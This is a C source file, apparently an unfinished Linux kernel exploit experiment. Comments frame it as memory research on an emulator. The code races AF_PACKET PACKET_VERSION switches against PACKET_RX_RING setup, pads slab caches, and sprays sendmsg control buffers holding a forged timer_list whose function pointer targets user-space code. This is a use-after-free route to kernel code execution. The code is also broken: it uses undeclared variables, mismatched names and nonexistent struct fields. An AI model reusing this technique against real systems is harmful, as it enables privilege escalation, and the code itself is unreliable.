//The goal here is to create af packets.
//This should create struct packet_socket objects allocated by the SLUB allocator.
//I will then dump the memory on the emulator using lime and try to find these sockets.
//I can then compare the size with that of what I determined from my kernel module to print the sizes and output.
//(y)
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#define BUFLEN 723
#define DATALEN 8192
#define NUM_THREADS 200

volatile int* check;
volatile int barrier = 1;
volatile int vers_switcher_done = 0;

#define TIMER_OFFSET 252
struct timer_list {
        int next;
        int prev;
        //struct list_head           entry;                /*     0     8 */
        long unsigned int          expires;              /*     8     4 */
        int base;//struct tvec_base *         base;                 /*    12     4 */
        void                       (*function)(long unsigned int); /*    16     4 */
        long unsigned int          data;                 /*    20     4 */
        int                        slack;                /*    24     4 */

        /* size: 28, cachelines: 1, members: 6 */
        /* last cacheline: 28 bytes */
};

typedef union {
    char   control[CMSG_SPACE(BUFLEN)];
    struct cmsghdr cmh;
    struct {
        char padding[TIMER_OFFSET];
        struct timer_list timer;
    };
    /* Space large enough to hold a ucred structure */
} control_un;

#define PAD 64
//int  ad_fds[PAD];

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

void func(long unsigned int asdf) {
    *check = 1;
}

void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;

    return NULL;
}


//void kmalloc(void)
//{
//    while(1)
//        syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
//}


void pad_kmalloc(void)
{
    int x;

    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            //printf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

void* lock_ctlbuf(void* threadid, control_un* ctrl_un) {
    long tid = (long)threadid;
    char buf2[100];
    int fd,rc,i;
    struct sockaddr_in server;
    char message[1000] , server_reply[2000];
    
    struct cmsghdr *cmhp;
    struct msghdr msgh;
    struct iovec iov;
    char data[DATALEN];
     
    //Create socket
    fd = socket(AF_INET , SOCK_STREAM , 0);
    if (fd == -1)
    {
        //printf("Could not create socket");
    }
    //puts("Socket created");
    int sendbuff = 2;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff)) < 0) {
        perror("Setting sock buff size");
    }
    //puts("Socket buffer size set");

     
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 5000 );
 
    //Connect to remote server
    if (connect(fd , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        perror("connect failed. Error");
    }
     
    //printf("Send Msg Test\n");
    memset(&ctrl_un, 'A', sizeof(ctrl_un));
    ctrl_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    ctrl_un.cmh.cmsg_level = SOL_SOCKET;
    ctrl_un.cmh.cmsg_type = SCM_RIGHTS;

    msgh.msg_name = NULL;
    msgh.msg_namelen = 0;

    msgh.msg_control = ctrl_un.control;
    msgh.msg_controllen = sizeof(ctrl_un.control);

    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;
    iov.iov_base = &data;
    iov.iov_len = sizeof(data);
    memset(&data, 0x41, sizeof(data));

    ////printf("Res: %d %s", res, strerror(errno));
    for ( i = 0; i < 600; ++i) {

        int res = sendmsg(fd, &msgh,0);
        if( res < 0)  {
                perror("sendmsg");
        }
        //printf("Sent Message %d\n",i);
    }
    pthread_exit(NULL);
}

int main(int argc, char** argv) 
{
    int fd;
    control_un ctrl;
    int threadCount = atoi(argv[1]);
    pad_kmalloc();
    check = malloc(sizeof(int));
    *check = 0;
    pthread_t setsockopt_thread_thread,a;

    fd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ARP));

    if (fd==-1) {
        //printf("target socket error\n");
        exit(1);
    }
    // want to create 
    struct stat tgtStat;
    if (fstat(fd,&tgtStat) < 0) {
        perror("fstat");
    } else {
        printf("target socket inode: %d\n", (unsigned int)tgtStat.st_ino);
        fflush(stdout);
    }


    pad_kmalloc();

    val = TPACKET_V3;

    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;
    tp.tp_retire_blk_tov = 10000;

    if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }

    pthread_create(&a, NULL, vers_switcher, (void *)NULL);

    usleep(200000);


    memset(&ctrl_un, 0x00, sizeof(ctrl_un));
    ctrl_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    ctrl_un.cmh.cmsg_level = SOL_SOCKET;
    ctrl_un.cmh.cmsg_type = SCM_RIGHTS;

    ctrl_un.t.timer->next = 0;
    ctrl_un.t.timer->prev = 0;
    ctrl_un.t.timer->base = 0;
    ctrl_un.t.timer->expires = 4294943360;
    ctrl_un.t.timer->function = (void *)func;
    ctrl_un.t.timer->data = arg;
    ctrl_un.t.timer->flags = 1;
    ctrl_un.t.timer->slack = -1;

    //start threads and alloc ctl buf's in slabs
    pthread_t dummy;
    long rc,t;
    for (t = 0; t < threadCount; t++) {
        rc = pthread_create(&dummy, NULL, lock_ctlbuf, (void*)t);
        if (rc) {
            perror("pthread_create()");
            exit(1);
        }
    }
    pthread_exit(NULL);
    sleep(13377);
    return 0;
}
